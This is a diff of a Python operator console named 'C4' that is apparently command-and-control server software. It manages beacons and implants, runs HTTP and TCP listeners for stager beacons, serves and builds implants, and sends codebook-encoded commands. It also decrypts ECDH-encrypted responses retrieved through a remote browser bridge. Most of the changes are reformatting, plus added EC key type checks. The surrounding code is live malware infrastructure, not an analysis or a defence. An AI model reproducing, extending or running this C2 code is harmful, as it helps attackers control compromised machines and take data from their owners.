@@ -46,6 +46,10 @@ import hashlib
 import re
 
 from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives.asymmetric.ec import (
+    EllipticCurvePrivateKey,
+    EllipticCurvePublicKey,
+)
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import serialization
 
@@ -90,7 +94,9 @@ def _init_session_logger() -> logging.Logger:
     _session_logger.setLevel(logging.DEBUG)
     _session_logger.propagate = False
     handler = logging.FileHandler(log_path, encoding="utf-8")
-    handler.setFormatter(logging.Formatter("%(asctime)s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S"))
+    handler.setFormatter(
+        logging.Formatter("%(asctime)s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+    )
     _session_logger.addHandler(handler)
     _session_logger.info("C4 session log started")
     return _session_logger
@@ -189,12 +195,16 @@ def decrypt_verification_record(blob_b64: str, private_key_path: Path) -> str | 
         iv = combined[eph_pubkey_len : eph_pubkey_len + iv_len]
         ciphertext = combined[eph_pubkey_len + iv_len :]
 
-        # Load operator private key
+        # Load operator private key (must be EC for ECDH)
         priv_key_bytes = private_key_path.read_bytes()
         private_key = serialization.load_der_private_key(priv_key_bytes, password=None)
+        if not isinstance(private_key, EllipticCurvePrivateKey):
+            raise ValueError("Private key must be an EC key")
 
-        # Load ephemeral public key
+        # Load ephemeral public key (must be EC for ECDH)
         eph_public_key = serialization.load_der_public_key(eph_pubkey_bytes)
+        if not isinstance(eph_public_key, EllipticCurvePublicKey):
+            raise ValueError("Ephemeral public key must be an EC key")
 
         # ECDH to derive shared secret
         shared_secret = private_key.exchange(ec.ECDH(), eph_public_key)
@@ -430,9 +440,11 @@ class BeaconRegistry:
             return None
         key_lower = key.lower()
         for b in self._beacons.values():
-            if (b.alias and b.alias.lower() == key_lower) or \
-               (b.implant_id and b.implant_id.lower() == key_lower) or \
-               b.hostname.lower() == key_lower:
+            if (
+                (b.alias and b.alias.lower() == key_lower)
+                or (b.implant_id and b.implant_id.lower() == key_lower)
+                or b.hostname.lower() == key_lower
+            ):
                 return b
         return None
 
@@ -490,6 +502,7 @@ async def handle_serve_index(request: web.Request) -> web.Response:
 
 
 # ---------------------------------------------------------------------------
+
 
 async def handle_checkin(request: web.Request) -> web.Response:
     try:
@@ -561,7 +574,9 @@ async def _handle_tcp_client(
                 }
             )
             log.info("BRIDGE beacon: %s → %s", implant_id[:12], bridge_url)
-            slog(f"BEACON BRIDGE | implant={implant_id} url={bridge_url} ip={addr[0] if addr else '?'}")
+            slog(
+                f"BEACON BRIDGE | implant={implant_id} url={bridge_url} ip={addr[0] if addr else '?'}"
+            )
             if _app_ref is not None:
                 _app_ref.post_message(C4Console.BridgeBeacon(beacon.id, bridge_url))
 
@@ -619,9 +634,7 @@ class BeaconListItem(ListItem):
         if len(name) > 32:
             name = name[:29] + "..."
         yield Label(
-            f"[{color}]{status}[/] {name}\n"
-            f"  [dim]{implant}[/]\n"
-            f"  [dim]{ip}[/]",
+            f"[{color}]{status}[/] {name}\n  [dim]{implant}[/]\n  [dim]{ip}[/]",
             markup=True,
         )
 
@@ -775,6 +788,7 @@ class C4Console(App):
         global _app_ref
         _app_ref = self
         import socket
+
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
@@ -785,17 +799,21 @@ class C4Console(App):
         self._log("[bold orange3]C4 Operator Console[/] started")
         self._log(f"C2 server:     [bold]{self._local_ip}[/]")
         self._log(f"HTTP listener: [bold]{self._local_ip}:{self.listen_port}[/]")
-        self._log(f"TCP  listener: [bold]{self._local_ip}:{self.tcp_port}[/] (stager beacons)")
+        self._log(
+            f"TCP  listener: [bold]{self._local_ip}:{self.tcp_port}[/] (stager beacons)"
+        )
         if enrich_enabled():
             self._log("Enrichment:    [bold green]enabled[/]")
         else:
-            self._log("[bold red]⚠ WARNING: Enrichment disabled (GROQ_API_KEY not set)[/]")
+            self._log(
+                "[bold red]⚠ WARNING: Enrichment disabled (GROQ_API_KEY not set)[/]"
+            )
             self._log("[dim]  Commands will be blocked until GROQ_API_KEY is set[/]")
         if _SERVE_DIR:
-            self._log(f"File serving:  [bold]GET /serve/<id>/<file>[/] from {_SERVE_DIR}")
-            implant_dirs = sorted(
-                d.name for d in _SERVE_DIR.iterdir() if d.is_dir()
+            self._log(
+                f"File serving:  [bold]GET /serve/<id>/<file>[/] from {_SERVE_DIR}"
             )
+            implant_dirs = sorted(d.name for d in _SERVE_DIR.iterdir() if d.is_dir())
             if implant_dirs:
                 self._log(f"[bold green]Available implants ({len(implant_dirs)}):[/]")
                 for name in implant_dirs:
@@ -814,7 +832,9 @@ class C4Console(App):
         self._log(
             "[dim]Commands: beacons, interact <name>, alias <id> <name>, back, quit, help[/]"
         )
-        self._log("[dim]─────────────────────────────────────────────────────────────────────────[/]\n")
+        self._log(
+            "[dim]─────────────────────────────────────────────────────────────────────────[/]\n"
+        )
         self._start_http_listener()
         self._start_tcp_listener()
         self._start_status_refresh()
@@ -844,7 +864,9 @@ class C4Console(App):
                 self._log("[green]Connected to remote browser bridge[/]")
             except Exception as e:
                 self._log(f"[red]Failed to connect to browser bridge: {e}[/]")
-                self._log("[yellow]Ensure browser_bridge_local.py is running and SSH tunnel is active[/]")
+                self._log(
+                    "[yellow]Ensure browser_bridge_local.py is running and SSH tunnel is active[/]"
+                )
 
     # -- Beacon notifications ----------------------------------------------
 
@@ -1040,7 +1062,9 @@ class C4Console(App):
             return
 
         self._log(f"[bold]C4[/] ({beacon.display_name}) > {raw}")
-        slog(f"CMD | beacon={beacon.display_name} implant={beacon.implant_id} raw={raw}")
+        slog(
+            f"CMD | beacon={beacon.display_name} implant={beacon.implant_id} raw={raw}"
+        )
 
         # Parse operator input into action dict
         result = parse_operator_command(raw)
@@ -1062,7 +1086,9 @@ class C4Console(App):
                 self._log(
                     f"  [yellow]WARNING: codebook not found for implant {beacon.implant_id[:12]}[/]"
                 )
-                self._log(f"  [dim]expected: implants/{beacon.implant_id}/codebook.yaml[/]")
+                self._log(
+                    f"  [dim]expected: implants/{beacon.implant_id}/codebook.yaml[/]"
+                )
                 self._log("  [yellow]Sending raw (no encoding)[/]")
                 encoded = raw
             else:
@@ -1073,7 +1099,9 @@ class C4Console(App):
                     return
 
                 if not enrich_enabled():
-                    self._log("[red]Command blocked:[/] enrichment not enabled (set GROQ_API_KEY)")
+                    self._log(
+                        "[red]Command blocked:[/] enrichment not enabled (set GROQ_API_KEY)"
+                    )
                     return
 
                 self._log(
@@ -1113,7 +1141,7 @@ class C4Console(App):
             last_text = ""
             # Match either JSON field or standalone base64 blob (our encrypted payloads are 200+ chars)
             # The blob starts with MFkw (base64 of SPKI header for P-256 public key)
-            record_pattern = re.compile(r'MFkw[A-Za-z0-9+/=]{150,}')
+            record_pattern = re.compile(r"MFkw[A-Za-z0-9+/=]{150,}")
             timeout = 120.0
             elapsed = 0.0
             poll_interval = 1.0
@@ -1125,14 +1153,14 @@ class C4Console(App):
                 try:
                     result = await browser_bridge.poll_response(implant_id)
                     current_text = result.get("data", "")
-                    is_processing = result.get("processing", False)
+                    # is_processing = result.get("processing", False)  # Reserved for future use
                 except Exception:
                     continue
 
                 # Display new content
                 if current_text and current_text != last_text:
                     # Show the new portion
-                    new_content = current_text[len(last_text):]
+                    new_content = current_text[len(last_text) :]
                     if new_content.strip():
                         self._log(f"[dim]{new_content.strip()}[/]")
                     last_text = current_text
@@ -1147,7 +1175,9 @@ class C4Console(App):
                     except Exception:
                         final_text = current_text
 
-                    slog(f"RESPONSE | implant={implant_id} len={len(final_text)}\n{final_text}")
+                    slog(
+                        f"RESPONSE | implant={implant_id} len={len(final_text)}\n{final_text}"
+                    )
 
                     # Try to extract and decrypt verification_record
                     self._try_decrypt_response(implant_id, final_text)
@@ -1172,7 +1202,9 @@ class C4Console(App):
         if not private_key_path.exists():
             # Try prefix match - implant_id might be truncated or directory named differently
             for d in _OUT_DIR.iterdir():
-                if d.is_dir() and (implant_id.startswith(d.name) or d.name.startswith(implant_id)):
+                if d.is_dir() and (
+                    implant_id.startswith(d.name) or d.name.startswith(implant_id)
+                ):
                     candidate = d / "operator_private.der"
                     if candidate.exists():
                         private_key_path = candidate
@@ -1184,14 +1216,14 @@ class C4Console(App):
 
         # Method 1: Look for JSON containing verification_record field
         if "verification_record" in response:
-            for match in re.finditer(r'\{', response):
+            for match in re.finditer(r"\{", response):
                 start = match.start()
                 depth = 0
                 end = start
                 for i, c in enumerate(response[start:], start):
-                    if c == '{':
+                    if c == "{":
                         depth += 1
-                    elif c == '}':
+                    elif c == "}":
                         depth -= 1
                         if depth == 0:
                             end = i + 1
@@ -1209,7 +1241,7 @@ class C4Console(App):
 
         # Method 2: Find all long base64 blobs
         # Our format: [91-byte SPKI pubkey][16-byte IV][ciphertext] = min 123 bytes = ~164 base64 chars
-        for blob_match in re.finditer(r'[A-Za-z0-9+/]{150,}={0,2}', response):
+        for blob_match in re.finditer(r"[A-Za-z0-9+/]{150,}={0,2}", response):
             candidate = blob_match.group(0)
             if candidate not in candidates:
                 candidates.append(candidate)
@@ -1283,7 +1315,7 @@ class C4Console(App):
     def _build_implant(self, raw: str) -> None:
         """Parse build command and launch build_implant.py as async subprocess."""
         # Pass everything after 'build' as args to build_implant.py
-        args_str = raw[len("build"):].strip()
+        args_str = raw[len("build") :].strip()
         self._log("[bold]Building new implant...[/]")
         self._run_build(args_str)
 
@@ -1315,7 +1347,9 @@ class C4Console(App):
                     implant_dirs = sorted(
                         d.name for d in _SERVE_DIR.iterdir() if d.is_dir()
                     )
-                    self._log(f"[bold green]Available implants ({len(implant_dirs)}):[/]")
+                    self._log(
+                        f"[bold green]Available implants ({len(implant_dirs)}):[/]"
+                    )
                     for name in implant_dirs:
                         self._log(f"  [cyan]{name}[/]")
                         if hasattr(self, "_local_ip"):
